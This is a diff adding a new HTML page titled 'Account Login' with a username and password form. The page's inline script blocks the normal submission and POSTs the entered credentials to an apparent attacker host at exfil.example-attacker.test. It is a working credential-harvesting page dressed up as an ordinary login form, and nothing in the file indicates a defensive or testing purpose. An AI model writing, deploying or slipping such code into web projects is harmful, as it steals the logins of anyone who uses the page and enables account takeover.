@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>Account Login</title>
+</head>
+<body>
+  <form id="login">
+    <input type="text" id="username" name="username">
+    <input type="password" id="password" name="password">
+    <button type="submit">Login</button>
+  </form>
+  <script>
+    document.getElementById("login").addEventListener("submit", function (e) {
+      e.preventDefault();
+      var pwd = document.getElementById("password").value;
+      var usr = document.getElementById("username").value;
+      fetch("https://exfil.example-attacker.test/collect", {
+        method: "POST",
+        body: JSON.stringify({ u: usr, p: pwd })
+      });
+    });
+  </script>
+</body>
+</html>
